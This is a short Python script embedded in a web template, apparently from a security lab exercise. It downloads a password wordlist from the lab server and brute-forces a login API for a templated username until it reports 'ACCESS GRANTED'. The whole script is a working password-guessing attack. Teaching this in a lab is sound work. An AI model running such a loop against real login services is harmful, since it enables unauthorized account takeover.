BASE  = "{{ request.scheme }}://{{ request.get_host }}"
LOGIN = BASE + "/api/login/"
USERNAME = "{{ lab.username }}"

# Pull the password list straight from the server
passwords = requests.get(BASE + "/api/wordlist.txt").text.splitlines()

for password in passwords:
    password = password.strip()
    if not password:
        continue
    r = requests.post(LOGIN, json={"username": USERNAME, "password": password})
    print(password, r.status_code)
    if r.json()["success"]:
        print("ACCESS GRANTED:", password); break
